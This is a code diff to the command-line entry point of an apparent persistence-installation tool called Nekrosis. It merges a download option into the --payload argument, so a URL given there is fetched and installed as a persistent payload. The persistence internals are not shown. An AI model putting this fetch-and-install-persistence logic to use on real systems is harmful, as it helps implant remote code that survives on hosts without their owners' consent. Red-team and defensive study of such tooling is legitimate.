@@ -258,7 +258,7 @@ def main():
         "-p",
         "--payload",
         action="store",
-        help="The payload to install."
+        help="The payload to install. This can either be a local file or one from a webserver"
     )
     parser.add_argument(
         "-m",
@@ -283,32 +283,27 @@ def main():
         choices=[(format.value) for format in ExportPersistenceTypes],
         help="Export the supported persistence methods to STDOUT in the specified format."
     )
-    parser.add_argument(
-        "-dp",
-        "--download-payload",
-        help="Download a payload from a web server and use it as your payload."
-    )
-
     args = parser.parse_args()
 
-    if args.download_payload:
-        nekrosis = Nekrosis(payload=args.download_payload, custom_method=args.method)
-        if nekrosis.download_payload(args.download_payload):
-            nekrosis.change_payload("download")
-            nekrosis.install()
-    else:
-        nekrosis = Nekrosis(payload=args.payload, custom_method=args.method)
-
-        if args.list_supported_methods or args.export:
-            if args.export:
-                print(nekrosis.export_persistence_methods(ExportPersistenceTypes(args.export)), end="")
+    if args.payload:
+            if args.payload.startswith("http://") or args.payload.startswith("https://"):
+                nekrosis = Nekrosis(payload=args.payload, custom_method=args.method)
+                if nekrosis.download_payload(args.payload):
+                    nekrosis.change_payload("download")
+                    nekrosis.install()
             else:
-                nekrosis._list_supported_persistence_methods()
-        else:
-            if not args.payload:
-                parser.print_help()
-                sys.exit(1)
-            nekrosis.install()
+                nekrosis = Nekrosis(payload=args.payload, custom_method=args.method)
+
+                if args.list_supported_methods or args.export:
+                    if args.export:
+                        print(nekrosis.export_persistence_methods(ExportPersistenceTypes(args.export)), end="")
+                    else:
+                        nekrosis._list_supported_persistence_methods()
+                else:
+                    nekrosis.install()
+    else:
+            parser.print_help()
+            sys.exit(1)
 
 if __name__ == "__main__":
     main()
